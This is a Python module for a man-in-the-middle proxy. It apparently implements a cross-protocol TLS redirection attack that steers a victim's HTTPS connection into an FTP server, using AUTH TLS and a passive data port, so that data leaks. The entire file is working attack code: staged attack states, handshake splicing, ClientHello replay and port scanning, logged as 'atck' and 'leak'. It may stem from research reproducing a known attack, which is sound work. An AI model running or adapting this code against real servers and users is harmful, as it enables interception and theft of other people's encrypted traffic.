import socket
import time
from collections import defaultdict

from utils.logging import _info, _error
from utils.tls import forward_tls_handshake_and_data

from utils.tls import read_tls_packet

FIRST_CONNECT = 0
ATTACK_PREPARATION_STARTED = 1
ATTACK_PREPARED = 2
ATTACK_FINISHED = 3


class FTPHandler:
    def __init__(self, target_ip, target_port, unarmed_target_ip, unarmed_target_port):
        self.status = defaultdict(int)
        self.target_ip = target_ip
        self.target_port = target_port
        self.unarmed_target_ip = unarmed_target_ip
        self.unarmed_target_port = unarmed_target_port

    def handle_connection(self, addr, client_socket, armed):
        if not armed:
            self._forward_http_traffic(addr, client_socket)
        else:
            if self.status[addr.ip] == FIRST_CONNECT:
                self._prepare_attack(addr, client_socket)
            elif self.status[addr.ip] == ATTACK_FINISHED:
                return
            else:
                self._leak_data(addr, client_socket)

    def _forward_http_traffic(self, addr, client_socket):
        _info("mitmproxy.atck", f"[{addr.ip}] [RUN] FORWARD HTTP TRAFFIC")
        _info("mitmproxy.atck", f"[{addr.ip}] [RUN] CONNECT TO {self.unarmed_target_ip}:{self.unarmed_target_port}")
        target_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        target_socket.connect((self.unarmed_target_ip, self.unarmed_target_port))
        _info("mitmproxy.atck", f"[{addr.ip}] [RUN] CONNECTED TO {self.unarmed_target_ip}:{self.unarmed_target_port}")
        forward_tls_handshake_and_data(addr, client_socket, target_socket)

    def _prepare_attack(self, addr, client_socket):
        _info("mitmproxy.atck", f"[{addr.ip}] [RUN] Attack Preparation")
        self.status[addr.ip] = ATTACK_PREPARATION_STARTED
        target_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        target_socket.connect((self.target_ip, self.target_port))
        target_socket.recv(4096)
        target_socket.sendall(b"AUTH TLS\r\n")  # AUTH SSL is also acceptable
        target_socket.recv(4096)

        forward_tls_handshake_and_data(addr, client_socket, target_socket)

        self.status[addr.ip] = ATTACK_PREPARED
        _info("mitmproxy.atck", f"[{addr.ip}] [FIN] Attack Preparation")

    def _leak_data(self, addr, client_socket):
        _info("mitmproxy.leak", f"[{addr.ip}] [RUN] Data Leakage")
        while self.status[addr.ip] != ATTACK_PREPARED:
            time.sleep(1)

        # Consume the ClientHello (do not use MSG_PEEK)
        client_hello = read_tls_packet(client_socket)
        time.sleep(5.0)
        # Retry scanning the PASV range for longer to allow the server to open a data port
        # Scan longer to catch the data port after RETR triggers server readiness
        deadline = time.time() + 60.0
        while time.time() < deadline:
            for pasv_port in range(10100, 10101):
                try:
                    _info("mitmproxy.leak", f"[{addr.ip}] Trying data port {self.target_ip}:{pasv_port}")
                    target_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    target_socket.settimeout(2.0)
                    target_socket.connect((self.target_ip, pasv_port))
                    if client_hello:
                        target_socket.sendall(client_hello)
                    try:
                        server_hello = read_tls_packet(target_socket)
                    except Exception:
                        raise ConnectionRefusedError
                    client_socket.sendall(server_hello)
                    forward_tls_handshake_and_data(addr, client_socket, target_socket)
                    client_socket.close()
                    target_socket.close()
                    self.status[addr.ip] = ATTACK_FINISHED
                    _info("mitmproxy.leak", f"[{addr.ip}] [FIN] Data Leakage")
                    return
                except ConnectionRefusedError:
                    _info("mitmproxy.leak", f"[{addr.ip}] ConnectionRefusedError")
                except Exception as e:
                    _info("mitmproxy.leak", f"[{addr.ip}] Error: {e}")
            time.sleep(0.75)
        _error("mitmproxy.leak", "Could not find open passive port")